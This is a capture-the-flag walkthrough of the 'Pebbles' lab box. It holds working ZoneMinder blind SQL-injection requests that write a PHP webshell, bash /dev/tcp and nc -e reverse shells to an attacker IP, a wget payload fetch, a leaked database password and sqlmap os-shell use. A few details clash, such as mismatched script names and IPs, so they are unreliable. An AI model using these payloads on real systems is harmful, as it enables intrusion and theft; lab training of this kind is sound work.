---
machine: Pebbles
platform: Proving Grounds
category: Linux
difficulty: Hard
tags: [zoneminder, blind-sqli, sqlmap, mysql-privesc]
date: 2026-07-23
status: retired
summary: An Ubuntu box running Tomcat and a video-surveillance webapp — testing a blind stacked-query SQL injection in the surveillance software to write a PHP webshell to disk, then chasing leaked database credentials into a root-owned MySQL instance that sqlmap's OS-shell can leverage for full compromise.
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/pebbles]
└─$ nmap-full 192.168.142.52  
[*] Running fast port discovery on 192.168.142.52...
[sudo] password for kali: 
[*] Open ports: 21,22,80,3305,8080
[*] Running full scan on 192.168.142.52...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 09:48 -0400
Nmap scan report for 192.168.142.52
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tomcat
|_http-favicon: Apache Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.37 seconds
```

We have 3 webapps and a non anonymous login ftp share:

Webapp on 80 is called Pebbles and seems to just contain a login portal.

Webapp on 3305 is the Apache2 default page

Webapp on 8080 is the default Tomcat page

I feroxbust all 3 webapps and find they all have `http://target/zm` endpoint. When navigated too, we find ZoneMinder v1.29.0 running.

https://www.exploit-db.com/exploits/41239

We see index.php is vulnerable to a SQL injection according to this exploit. We could use the vulnerable parameter to attempt to gain code execution depending on the language.

https://vk9-sec.com/zoneminder-1-291-30-exploitation-multiple-vulnerabilities/?source=post_page-----d2a28edbd22b---------------------------------------

We follow the vulnerable zoneminder guide and exploit-db article and find we can invoke SELECT SLEEP(5);' as a stacked query on limit in burpsuite:

```http
POST /zm/index.php HTTP/1.1
Host: target
Content-Length: 91
X-Request: JSON
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://target
Referer: http://target/zm/index.php?view=log
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=v6ih9q8buv14tpat0kb0vag6o1
Connection: keep-alive

view=request&request=log&task=query&limit=100; SELECT SLEEP(5);'#&minTime=1784945768.468635
```

Since it takes 5 seconds to return we know the command successfully executed despite receiving no visual output back (this makes it a blind SQLi).

## Foothold

We will try to use this stacked query injection vector to inject a PHP webshell which we can use for arbitrary execution as the webapp user.

We will use the `SELECT "<payload>" INTO OUTFILE "filepath"`

```http
POST /zm/index.php HTTP/1.1
Host: target
Content-Length: 187
X-Request: JSON
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://target
Referer: http://target/zm/index.php?view=log
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=v6ih9q8buv14tpat0kb0vag6o1
Connection: keep-alive

view=request&request=log&task=query&limit=100;SELECT 'payload'; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";SELECT SLEEP(5);'#&minTime=1784945768.468635
```

Running this command it hangs for 5 seconds, indicating the sleep went through and, thus, the webshell.

`http://target/shell.php?cmd=whoami` gives us a Not Found error, despite the fact that it should be at the web root `/var/www/html`.

However, if we go to `http://target:3305/shell.php?cmd=whoami` we see www-data.

I actually spent alot of time trying different methods to get a php revshell from my webshell. I ran into sanitization errors repeatedly from trying to execute commands without characters which conflicted with the url encoding or mysql syntax.

I eventually settled on writing a simple bash /dev/tcp/ revshell (`21.sh`) and serving it from my python webserver to the remote /tmp/ directory via wget.

```bash
┌──(kali㉿kali)-[~/oscp/pebbles]
└─$ cat 21.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.231/21 0>&1
```

NOTE: Serving on port 9999 DOES NOT WORK on this box. Swap to a common port in use on the machine to mitigate this issue. I used port 80 to serve my local files and it worked well the moment I switched. This is also true for the revshell listener, we can't use our normal 1337, 4444, 9999,etc.

```bash
curl http://target:3305/shell.php?cmd=wget%20192.168.45.231/4444.sh%20-O%20/tmp/21.sh

┌──(kali㉿kali)-[~/oscp/pebbles]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.147.52 - - [25/Jul/2026 09:04:49] "GET /21.sh HTTP/1.1" 200 -

curl http://target:3305/shell.php?cmd=ls%20/tmp 

21.sh
systemd-private-55917371f85048afa3fbf80e60dc60e5-systemd-timesyncd.service-39aJTr
vmware-root
zm
```

Finally, we start a listener on port 21 with penelope and execute the revshell script with our webshell:

```bash
curl http://target:3305/shell.php?cmd=/bin/bash%20/tmp/21.sh

www-data@pebbles:/var/www/html$ whoami
www-data
```

We have our foothold user now as `www-data`, we just need to privesc now. Let's download and run winpeas on the target.

## Privilege Escalation

A few things to try:

```text
#owned by root and readable by me but not globally readable
/etc/zm/zm.conf  
```

```text
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                
-rwsr-xr-x 1 root root 39K Mar 26  2019 /usr/bin/newgrp  --->  HP-UX_10.20                                                                         
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newuidmap
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Mar 26  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 71K Mar 26  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newgidmap
-rwsr-sr-x 1 root root 105K Nov 22  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 83K Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
```

We can attempt mount gtfobin privesc.

Interesting reads:

```text
/etc/passwd
/usr/share/doc/openssh-client/examples/sshd_config
-rw-r--r-- 1 root root 3081 Jun 22  2020 /etc/mysql/my.cnf
/usr/share/zoneminder/www/api/app/Plugin/Crud/.git
/etc/mysql/debian.cnf
```

And most interestingly: `MySQL is running as root with version 5.7.30. This is a potential local privilege escalation vulnerability!`

```text
╔══════════╣ Searching mysql credentials and exec (T1552.001)
From '/etc/mysql/my.cnf' Mysql user: user               = root                                          
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = root3
```

We can't sudo mount because we don't have www-data's password so we move on to gaining access to the mysql service.

We read `/etc/zm/zm.conf` and find:

```text
# ZoneMinder database user
ZM_DB_USER=root

# ZoneMinder database password
ZM_DB_PASS=ShinyLucentMarker361
```

I try this cred on the root user but it fails, next we try the mysql database with it.

I got stuck here and read a few writeups on how other people went about the box. Here I discovered that there are atleast two paths to solve the box: Using sqlmap to gain a shell as the root user in the earlier blind sqli, and performing a rather complicated MySQL RCE exploit: https://www.exploit-db.com/exploits/1518.

Since both are likely outside the scope of OSCP, I will simply employ sqlmap on the vulnerable url to gain root access to the box. Since sqlmap's os-shell is slow, you may want to serve a nc binary and use that to connect to a listener for a more robust shell, but I will just grab the flag via the os-shell:

### Revshell From SQLMaps OS-Shell

```bash
wget “http://target/nc" -O /tmp/nc
chmod +x /tmp/nc
/tmp/nc -e /bin/bash <host_ip> 3305
```

```bash
sqlmap http://target/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=10" -p "limit" --os-shell

os-shell> cat /root/proof.txt
do you want to retrieve the command standard output? [Y/n/a] y
[10:34:52] [INFO] retrieved: b14cc...
command standard output: 'b14cc...'
```
